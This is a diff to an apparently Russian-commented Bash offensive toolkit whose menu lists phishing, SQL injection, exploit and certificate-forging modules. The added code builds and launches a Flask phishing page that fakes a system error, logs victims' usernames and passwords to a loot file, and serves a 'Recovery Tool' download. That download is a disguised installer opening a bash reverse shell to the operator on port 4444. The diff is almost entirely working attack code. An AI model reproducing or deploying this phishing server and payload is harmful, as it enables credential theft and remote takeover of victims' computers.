@@ -273,7 +273,7 @@ EOF
 # --- ГЛАВНОЕ МЕНЮ ---
 run_main_menu() {
     local main_names="GHOST_COMMANDER SOCIAL_ENG SQLMAP DEVICE_HACK EXPLOIT_HUB TOTAL_OSINT IBAN_SCAN PWD_GEN CERT_FORGE CERT_READER NET_SCAN_v2 ULTIMATE_EXPLOIT PC_RECOVERY VIEW_LOOT SYSTEM_INFO SERVICE_HUB REPAIR UPDATE_CORE EXIT"
-    local main_funcs="run_ghost_commander run_phishing run_sqlmap run_device_hack run_exploit_hub run_smart_osint_engine run_iban_scan run_pwd_gen run_cert_forge run_cert_analyzer run_heuristic_scanner_v2 run_prime_exploiter_v4 run_pc_recovery_ultimate run_view_loot run_system_info run_servers run_repair update_prime exit_script"
+    local main_funcs="run_ghost_commander run_phantom_engine run_sqlmap run_device_hack run_exploit_hub run_smart_osint_engine run_iban_scan run_pwd_gen run_cert_forge run_cert_analyzer run_heuristic_scanner_v2 run_prime_exploiter_v4 run_pc_recovery_ultimate run_view_loot run_system_info run_servers run_repair update_prime exit_script"
     
     prime_dynamic_controller "PRIME MASTER v$CURRENT_VERSION" "$main_names" "$main_funcs"
 }
@@ -386,22 +386,82 @@ run_system_info() {
     pause
 }
 
+generate_phantom_server_code() {
+    local target_file="$1"
+    local mode="$2"
+    local layout=$(generate_core_template)
 
-run_phishing() {
-    print_header "SOCIAL ENGINEERING HUB"
+    cat << EOF > "$target_file"
+from flask import Flask, request, render_template_string, send_from_directory
+import os
 
-    # Ищем путь
-    local Z_PATH=$(find /root /home /opt -maxdepth 2 -type d -name "zphisher" 2>/dev/null | head -n1)
+app = Flask(__name__)
+LOOT = "$LOOT_DIR/phantom_loot.log"
 
-    # Проверяем всё одной цепочкой. Если хоть один шаг вернет 1, выполнение остановится.
-    check_step "dir" "$Z_PATH" "ZPhisher not found." || { pause; return; }
-    check_step "cmd" "php" "PHP is required but not installed." || { pause; return; }
+$layout
 
-    print_status "s" "All checks passed. Launching..."
-    ( cd "$Z_PATH" && ./zphisher.sh )
-    pause
+@app.route('/')
+def index():
+    content = """
+    <div class="status-box infected">CRITICAL SYSTEM ERROR: 0x80041F</div>
+    <p style='color:#888;'>Security token expired. Re-authentication required.</p>
+    <form method='post' action='/auth'>
+        <input type='text' name='u' placeholder='System ID / Email' required style='background:#000; color:#0cf; border:1px solid #333; padding:10px; width:85%; margin-bottom:10px;'>
+        <input type='password' name='p' placeholder='Secure Key' required style='background:#000; color:#0cf; border:1px solid #333; padding:10px; width:85%;'>
+        <button type='submit'>VERIFY & RECOVER</button>
+    </form>
+    """
+    if "$mode" != "creds":
+        content += "<p style='margin-top:20px; font-size:0.7em;'>Or download <a href='/download' style='color:#00ff41;'>Recovery Tool</a>.</p>"
+    
+    return render_template_string(render_prime_page("PHANTOM_RECOVERY_NODE", content))
+
+@app.route('/auth', methods=['POST'])
+def auth():
+    with open(LOOT, "a") as f:
+        f.write(f"[AUTH] {request.remote_addr} | U: {request.form.get('u')} | P: {request.form.get('p')}\n")
+    return render_template_string(render_prime_page("ACCESS_DENIED", "<div class='status-box infected'>INVALID CREDENTIALS</div><a href='/' class='btn'>RETRY</a>"))
+
+@app.route('/download')
+def download():
+    return send_from_directory("$LOOT_DIR", "update_installer.sh", as_attachment=True)
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=80)
+EOF
 }
 
+
+
+run_phantom_engine() {
+    print_header "PRIME PHANTOM FRAMEWORK"
+
+    local srv_path="/root/phantom_srv.py"
+    local payload_path="$LOOT_DIR/update_installer.sh"
+
+    # Выбор стратегии
+    local attack_type=$(select_option "SELECT STRATEGY:" \
+        "Credential Capture:creds" \
+        "Full Hybrid (Creds + Payload):hybrid" \
+        "Cancel:exit")
+    [[ "$attack_type" == "exit" ]] && return
+
+    # Создаем полезную нагрузку (как в Metasploit)
+    print_status "i" "Forging payload..."
+    echo -e "#!/bin/bash\necho 'Updating system...'\nbash -i >& /dev/tcp/$(ip route get 1.2.3.4 | awk '{print $7}' | head -n1)/4444 0>&1 &" > "$payload_path"
+    chmod +x "$payload_path"
+
+    # Вызов генератора (Завод начинает работу)
+    generate_phantom_server_code "$srv_path" "$attack_type"
+
+    # Запуск
+    print_status "w" "Activating Phantom Gate on port 80..."
+    fuser -k 80/tcp >/dev/null 2>&1
+    python3 "$srv_path" > /dev/null 2>&1 &
+    
+    print_status "s" "PHANTOM GATEWAY OPERATIONAL"
+    pause
+}
 
 run_sqlmap() {
     print_header "SMART SQL INJECTION (SQLMAP)"
